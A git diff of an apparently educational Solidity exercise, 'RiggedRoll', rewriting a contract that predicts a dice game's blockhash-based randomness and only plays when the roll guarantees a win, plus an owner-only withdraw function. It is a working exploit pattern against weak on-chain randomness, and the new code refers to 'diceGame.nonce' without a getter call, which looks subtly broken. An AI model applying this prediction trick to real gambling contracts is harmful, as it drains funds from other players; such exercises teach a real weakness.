@@ -8,38 +8,36 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 contract RiggedRoll is Ownable {
 
     DiceGame public diceGame;
-    uint256 public nonce = 0;
 
+    event Roll(address indexed player, uint256 amount, uint256 roll);
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    function riggedRoll() external  {
-
-        require(address(this).balance >= .002 ether, "not enough ether");
-
-        // prepare to call rollTheDice
-        bytes32 prevHash = blockhash(block.number - 1);
-        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
-        uint256 predictedRoll = uint256(hash) % 16;
-
-        // Revert if roll is above 5
-        if(predictedRoll > 5) revert();
+    function withdraw(address _to, uint256 _amount) external onlyOwner {
+        require(_to != address(0), "Invalid address");
+        require(address(this).balance >= _amount, "Insufficient balance in the contract");
         
-        diceGame.rollTheDice{ value: .002 ether }();
-            
-        nonce ++;
-         
+        (bool success, ) = _to.call{value: _amount}("");
+        require(success, "Transfer failed");
     }
 
-    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
-    function withdraw(address payable to, uint256 amount) external onlyOwner {
-        require(address(this).balance >= amount, "Insufficient balance");
-        (bool success, ) = to.call{value: amount}("");
-        require(success, "External contract call failed.");
+    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
+    function riggedRoll() external onlyOwner {
+        require(address(this).balance >= 0.002 ether, "Insufficient balance in the contract");
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce));
+        uint256 roll = uint256(hash) % 16;
+
+        if (roll <= 5) {
+            diceGame.rollTheDice{value: 0.002 ether}();
+            emit Roll(msg.sender, 0.002 ether, roll);
+        } else {
+            revert("Dice roll greater than 5");
+        }
     }
 
+    // Include the `receive()` function to enable the contract to receive incoming Ether.
     receive() external payable {}
-
 }
